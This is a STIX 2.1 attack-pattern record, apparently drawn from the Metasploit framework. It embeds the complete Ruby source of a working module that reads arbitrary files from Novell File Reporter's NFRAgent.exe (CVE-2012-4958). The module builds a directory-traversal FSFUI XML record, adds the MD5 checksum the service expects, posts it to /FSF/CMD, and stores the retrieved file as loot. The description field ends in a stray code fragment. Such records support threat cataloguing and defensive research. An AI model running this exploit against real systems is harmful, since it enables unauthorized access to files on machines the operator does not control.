{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2890954b-3b20-41b3-af84-f0cff00e28de",
    "created": "2024-08-14T16:30:44.336675Z",
    "modified": "2024-08-14T16:30:44.336679Z",
    "name": "NFR Agent FSFUI Record Arbitrary Remote File Access",
    "description": " NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve arbitrary text files via a directory traversal while handling requests to /FSF/CMD with an FSFUI record with UICMD 126. This module has been tested successfully against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).  'References'   => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess.rb",
            "external_id": "novell_file_reporter_fsfui_fileaccess.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'NFR Agent FSFUI Record Arbitrary Remote File Access',\n      'Description'  =>  %q{\n        NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve\n        arbitrary text files via a directory traversal while handling requests to /FSF/CMD\n        with an FSFUI record with UICMD 126. This module has been tested successfully\n        against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File\n        Reporter 1.0.1).\n      },\n      'References'   =>\n        [\n          [ 'CVE', '2012-4958' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/' ]\n        ],\n      'Author'       =>\n        [\n          'juan vazquez'\n        ],\n      'License'      => MSF_LICENSE,\n      'DisclosureDate' => \"Nov 16 2012\"\n    )\n\n    register_options(\n    [\n      Opt::RPORT(3037),\n      OptBool.new('SSL', [true, 'Use SSL', true]),\n      OptString.new('RFILE', [true, 'Remote File', 'windows\\\\win.ini']),\n      OptInt.new('DEPTH', [true, 'Traversal depth', 6])\n    ])\n\n  end\n\n  def run_host(ip)\n\n    traversal = \"..\\\\\" * datastore['DEPTH']\n    record = \"<RECORD><NAME>FSFUI</NAME><UICMD>126</UICMD><FILE>#{traversal}#{datastore['RFILE']}</FILE></RECORD>\"\n    md5 = Rex::Text.md5(\"SRS\" + record + \"SERVER\").upcase\n    message = md5 + record\n\n    print_status(\"Retrieving the file contents\")\n\n    res = send_request_cgi(\n      {\n        'uri'     => '/FSF/CMD',\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"text/xml\",\n        'data'    => message\n      })\n\n    if res and res.code == 200 and res.body =~ /<RESULT><VERSION>1<\\/VERSION><STATUS>0<\\/STATUS><CFILE><\\!\\[CDATA\\[(.*)\\]\\]><\\/CFILE><\\/RESULT>/m\n      loot = $1\n      f = ::File.basename(datastore['RFILE'])\n      path = store_loot('novell.filereporter.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n      print_good(\"#{datastore['RFILE']} saved in #{path}\")\n    else\n      print_error(\"Failed to retrieve the file contents\")\n    end\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "\"Nov 16 2012\""
}